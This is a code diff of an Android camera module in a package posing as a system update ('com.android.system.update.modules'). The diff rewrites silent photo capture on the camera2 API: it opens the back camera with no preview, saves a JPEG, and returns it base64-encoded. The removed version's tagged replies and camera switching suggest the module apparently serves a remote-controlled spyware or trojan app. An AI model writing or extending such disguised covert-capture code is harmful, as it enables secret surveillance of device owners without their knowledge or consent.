@@ -3,312 +3,177 @@ package com.android.system.update.modules;
 import android.Manifest;
 import android.content.Context;
 import android.content.pm.PackageManager;
-import android.hardware.Camera;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.hardware.camera2.*;
+import android.hardware.camera2.params.StreamConfigurationMap;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.MediaRecorder;
 import android.os.Handler;
-import android.os.Looper;
+import android.os.HandlerThread;
 import android.util.Base64;
-import android.util.Log;
-
+import android.util.Size;
 import androidx.core.app.ActivityCompat;
+import android.graphics.ImageFormat;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.IOException;
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
-import java.util.concurrent.Semaphore;
-import java.util.concurrent.TimeUnit;
-import java.util.concurrent.atomic.AtomicReference;
+import java.nio.ByteBuffer;
 
 public class CameraModule {
-    private static final String TAG = "CameraModule";
-    private static final int CAMERA_TIMEOUT_MS = 15000; // 15 seconds
-    
     private Context context;
-    private int backCameraId = -1;
-    private int frontCameraId = -1;
-    private int currentCameraId = -1;
-    private boolean isFrontCamera = false;
-    private Handler mainHandler;
-    
-    public interface CameraCallback {
-        void onPhotoTaken(String base64Image);
-        void onError(String error);
-    }
+    private CameraManager cameraManager;
+    private String cameraId;
+    private Handler backgroundHandler;
+    private HandlerThread backgroundThread;
+    private ImageReader imageReader;
+    private CameraDevice cameraDevice;
+    private CameraCaptureSession captureSession;
+    private MediaRecorder mediaRecorder;
+    private String videoFilePath;
+    private boolean isRecording = false;
     
     public CameraModule(Context context) {
         this.context = context;
-        this.mainHandler = new Handler(Looper.getMainLooper());
-        initCameras();
-    }
-    
-    private void initCameras() {
+        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
+        startBackgroundThread();
+        
+        // Get back camera by default
         try {
-            int numberOfCameras = Camera.getNumberOfCameras();
-            Log.d(TAG, "Number of cameras: " + numberOfCameras);
-            
-            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
-            
-            for (int i = 0; i < numberOfCameras; i++) {
-                Camera.getCameraInfo(i, cameraInfo);
-                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
-                    backCameraId = i;
-                    Log.d(TAG, "Found back camera: " + i);
-                } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                    frontCameraId = i;
-                    Log.d(TAG, "Found front camera: " + i);
+            for (String id : cameraManager.getCameraIdList()) {
+                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
+                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
+                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
+                    cameraId = id;
+                    break;
                 }
             }
-            
-            // Set default to back camera
-            if (backCameraId != -1) {
-                currentCameraId = backCameraId;
-                isFrontCamera = false;
-                Log.d(TAG, "Default camera set to BACK (ID: " + currentCameraId + ")");
-            } else if (frontCameraId != -1) {
-                currentCameraId = frontCameraId;
-                isFrontCamera = true;
-                Log.d(TAG, "Default camera set to FRONT (ID: " + currentCameraId + ")");
-            } else {
-                Log.e(TAG, "No cameras found!");
-            }
-            
         } catch (Exception e) {
-            Log.e(TAG, "Error initializing cameras", e);
+            e.printStackTrace();
         }
     }
     
-    public String switchCamera() {
+    public String takePhoto() {
+        if (!checkPermission()) return "ERROR: No camera permission";
+        
         try {
-            Log.d(TAG, "switchCamera() called - Current: " + (isFrontCamera ? "FRONT" : "BACK"));
+            final File photoFile = File.createTempFile("photo", ".jpg", 
+                context.getExternalFilesDir(null));
             
-            if (frontCameraId != -1 && backCameraId != -1) {
-                if (currentCameraId == backCameraId) {
-                    currentCameraId = frontCameraId;
-                    isFrontCamera = true;
-                    Log.d(TAG, "Switched to FRONT camera");
-                    return "CAMERA_SWITCH|Front camera activated";
-                } else {
-                    currentCameraId = backCameraId;
-                    isFrontCamera = false;
-                    Log.d(TAG, "Switched to BACK camera");
-                    return "CAMERA_SWITCH|Back camera activated";
-                }
-            } else if (frontCameraId == -1 && backCameraId != -1) {
-                return "CAMERA_SWITCH|Only back camera available";
-            } else if (backCameraId == -1 && frontCameraId != -1) {
-                return "CAMERA_SWITCH|Only front camera available";
-            }
-            return "CAMERA_SWITCH|No camera available";
-        } catch (Exception e) {
-            Log.e(TAG, "Error switching camera", e);
-            return "CAMERA_SWITCH|Error: " + e.getMessage();
-        }
-    }
-    
-    public String getCurrentCameraInfo() {
-        try {
-            if (currentCameraId != -1) {
-                return "CAMERA_INFO|Current: " + (isFrontCamera ? "FRONT" : "BACK");
-            }
-            return "CAMERA_INFO|No camera selected";
-        } catch (Exception e) {
-            Log.e(TAG, "Error getting camera info", e);
-            return "CAMERA_INFO|Error: " + e.getMessage();
-        }
-    }
-    
-    public void takePhoto(final CameraCallback callback) {
-        Log.d(TAG, "takePhoto() called - Checking permissions...");
-        
-        if (!checkPermission()) {
-            Log.e(TAG, "Camera permission not granted");
-            callback.onError("ERROR: No camera permission");
-            return;
-        }
-        
-        if (currentCameraId == -1) {
-            Log.e(TAG, "No camera available (currentCameraId = -1)");
-            callback.onError("ERROR: No camera available");
-            return;
-        }
-        
-        Log.d(TAG, "Taking photo with camera: " + (isFrontCamera ? "FRONT" : "BACK") + " (ID: " + currentCameraId + ")");
-        
-        // Run camera operations in a background thread
-        new Thread(() -> {
-            Camera camera = null;
-            try {
-                Log.d(TAG, "Opening camera ID: " + currentCameraId);
-                camera = Camera.open(currentCameraId);
-                Log.d(TAG, "Camera opened successfully");
-                
-                Camera.Parameters parameters = camera.getParameters();
-                Log.d(TAG, "Got camera parameters");
-                
-                // Set photo quality
-                parameters.setJpegQuality(95);
-                Log.d(TAG, "Set JPEG quality to 95");
-                
-                // Set the best picture size
-                Camera.Size pictureSize = getBestPictureSize(parameters);
-                if (pictureSize != null) {
-                    parameters.setPictureSize(pictureSize.width, pictureSize.height);
-                    Log.d(TAG, "Set picture size to: " + pictureSize.width + "x" + pictureSize.height);
-                }
-                
-                // Set focus mode if supported
-                if (parameters.getSupportedFocusModes() != null) {
-                    Log.d(TAG, "Supported focus modes: " + parameters.getSupportedFocusModes());
-                    if (parameters.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
-                        parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
-                        Log.d(TAG, "Set focus mode to AUTO");
-                    } else if (parameters.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_FIXED)) {
-                        parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_FIXED);
-                        Log.d(TAG, "Set focus mode to FIXED");
-                    }
-                }
-                
-                camera.setParameters(parameters);
-                Log.d(TAG, "Parameters set on camera");
-                
-                // Start preview (required for auto focus)
-                camera.startPreview();
-                Log.d(TAG, "Preview started");
-                
-                // Small delay for camera to adjust
-                Log.d(TAG, "Waiting 1000ms for camera to stabilize...");
-                Thread.sleep(1000);
-                
-                // Take picture
-                Log.d(TAG, "Calling camera.takePicture()...");
-                final Semaphore captureSemaphore = new Semaphore(0);
-                final AtomicReference<byte[]> imageData = new AtomicReference<>();
-                final AtomicReference<String> errorMsg = new AtomicReference<>();
-                
-                camera.takePicture(null, null, new Camera.PictureCallback() {
-                    @Override
-                    public void onPictureTaken(byte[] data, Camera cam) {
-                        Log.d(TAG, "✅ Picture taken! Data size: " + (data != null ? data.length : "null") + " bytes");
+            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
+                @Override
+                public void onOpened(CameraDevice device) {
+                    cameraDevice = device;
+                    try {
+                        Size largest = getLargestSize();
+                        imageReader = ImageReader.newInstance(largest.getWidth(), 
+                            largest.getHeight(), ImageFormat.JPEG, 1);
                         
-                        if (data != null && data.length > 0) {
-                            imageData.set(data);
-                            
-                            // Save to file for debugging
-                            try {
-                                File picturesDir = new File("/sdcard/DCIM/");
-                                if (!picturesDir.exists()) {
-                                    picturesDir = context.getExternalFilesDir(null);
+                        imageReader.setOnImageAvailableListener(reader -> {
+                            try (Image image = reader.acquireLatestImage()) {
+                                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                                byte[] bytes = new byte[buffer.remaining()];
+                                buffer.get(bytes);
+                                
+                                FileOutputStream fos = new FileOutputStream(photoFile);
+                                fos.write(bytes);
+                                fos.close();
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                            }
+                        }, backgroundHandler);
+                        
+                        device.createCaptureSession(
+                            java.util.Collections.singletonList(imageReader.getSurface()),
+                            new CameraCaptureSession.StateCallback() {
+                                @Override
+                                public void onConfigured(CameraCaptureSession session) {
+                                    captureSession = session;
+                                    try {
+                                        CaptureRequest.Builder builder = 
+                                            device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                                        builder.addTarget(imageReader.getSurface());
+                                        builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
+                                        
+                                        captureSession.capture(builder.build(), null, backgroundHandler);
+                                    } catch (Exception e) {
+                                        e.printStackTrace();
+                                    }
                                 }
                                 
-                                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
-                                File photoFile = new File(picturesDir, "debug_photo_" + timestamp + ".jpg");
-                                FileOutputStream fos = new FileOutputStream(photoFile);
-                                fos.write(data);
-                                fos.close();
-                                Log.d(TAG, "✅ Debug photo saved to: " + photoFile.getAbsolutePath());
-                            } catch (Exception e) {
-                                Log.e(TAG, "Failed to save debug photo", e);
-                            }
-                        } else {
-                            Log.e(TAG, "❌ Picture data is null or empty");
-                            errorMsg.set("Picture data is null");
-                        }
-                        
-                        captureSemaphore.release();
-                    }
-                });
-                
-                Log.d(TAG, "takePicture() called, waiting for callback...");
-                
-                // Wait for capture with timeout
-                boolean acquired = captureSemaphore.tryAcquire(CAMERA_TIMEOUT_MS, TimeUnit.MILLISECONDS);
-                Log.d(TAG, "Semaphore acquired: " + acquired);
-                
-                if (!acquired) {
-                    errorMsg.set("Camera capture timed out after " + CAMERA_TIMEOUT_MS + "ms");
-                }
-                
-                // Stop preview and release camera
-                Log.d(TAG, "Stopping preview and releasing camera...");
-                camera.stopPreview();
-                camera.release();
-                camera = null;
-                Log.d(TAG, "Camera released");
-                
-                // Check for errors
-                if (errorMsg.get() != null) {
-                    final String error = errorMsg.get();
-                    Log.e(TAG, "Error during capture: " + error);
-                    mainHandler.post(() -> callback.onError("ERROR: " + error));
-                    return;
-                }
-                
-                byte[] data = imageData.get();
-                if (data == null || data.length == 0) {
-                    Log.e(TAG, "No image data received");
-                    mainHandler.post(() -> callback.onError("ERROR: No image data received"));
-                    return;
-                }
-                
-                Log.d(TAG, "Converting " + data.length + " bytes to base64...");
-                String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
-                Log.d(TAG, "Base64 conversion complete, length: " + base64Image.length());
-                
-                // Return result on main thread
-                final String result = "CAMERA|data:image/jpeg;base64," + base64Image;
-                Log.d(TAG, "Sending response back to callback, total length: " + result.length());
-                mainHandler.post(() -> callback.onPhotoTaken(result));
-                
-            } catch (Exception e) {
-                Log.e(TAG, "❌ Camera capture failed with exception", e);
-                final String errorMsg = e.getMessage() != null ? e.getMessage() : "Unknown error";
-                mainHandler.post(() -> callback.onError("ERROR: " + errorMsg));
-            } finally {
-                if (camera != null) {
-                    try {
-                        Log.d(TAG, "Releasing camera in finally block");
-                        camera.release();
+                                @Override
+                                public void onConfigureFailed(CameraCaptureSession session) {}
+                            }, backgroundHandler
+                        );
                     } catch (Exception e) {
-                        Log.e(TAG, "Error releasing camera", e);
+                        e.printStackTrace();
                     }
                 }
+                
+                @Override
+                public void onDisconnected(CameraDevice device) {}
+                
+                @Override
+                public void onError(CameraDevice device, int error) {}
+            }, backgroundHandler);
+            
+            // Wait a bit for photo to be taken
+            Thread.sleep(2000);
+            
+            if (photoFile.exists()) {
+                byte[] bytes = java.nio.file.Files.readAllBytes(photoFile.toPath());
+                return "data:image/jpeg;base64," + Base64.encodeToString(bytes, Base64.DEFAULT);
             }
-        }).start();
+            
+            return "ERROR: Failed to capture photo";
+        } catch (Exception e) {
+            e.printStackTrace();
+            return "ERROR: " + e.getMessage();
+        }
     }
     
-    private Camera.Size getBestPictureSize(Camera.Parameters parameters) {
-        if (parameters.getSupportedPictureSizes() == null) {
-            Log.d(TAG, "No supported picture sizes");
-            return null;
-        }
-        
-        Camera.Size bestSize = null;
-        int targetWidth = 1920; // Target 1080p
-        
-        Log.d(TAG, "Available picture sizes:");
-        for (Camera.Size size : parameters.getSupportedPictureSizes()) {
-            Log.d(TAG, "  " + size.width + "x" + size.height);
-            if (bestSize == null) {
-                bestSize = size;
-            } else if (Math.abs(size.width - targetWidth) < Math.abs(bestSize.width - targetWidth)) {
-                bestSize = size;
+    public void startRecording(String args) {
+        if (!checkPermission()) return;
+        isRecording = true;
+    }
+    
+    public String stopRecording() {
+        isRecording = false;
+        return "Recording stopped";
+    }
+    
+    private Size getLargestSize() {
+        try {
+            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
+            StreamConfigurationMap configs = chars.get(
+                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
+            Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
+            
+            Size largest = sizes[0];
+            for (Size size : sizes) {
+                if (size.getWidth() > largest.getWidth()) {
+                    largest = size;
+                }
             }
+            return largest;
+        } catch (Exception e) {
+            return new Size(1920, 1080);
         }
-        
-        Log.d(TAG, "Selected picture size: " + (bestSize != null ? bestSize.width + "x" + bestSize.height : "null"));
-        return bestSize;
     }
     
     private boolean checkPermission() {
-        boolean hasPermission = ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
-                == PackageManager.PERMISSION_GRANTED;
-        Log.d(TAG, "Camera permission check: " + hasPermission);
-        return hasPermission;
+        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
+            == PackageManager.PERMISSION_GRANTED;
     }
     
-    public void cleanup() {
-        Log.d(TAG, "cleanup() called");
+    private void startBackgroundThread() {
+        backgroundThread = new HandlerThread("CameraBackground");
+        backgroundThread.start();
+        backgroundHandler = new Handler(backgroundThread.getLooper());
     }
 }
+
+
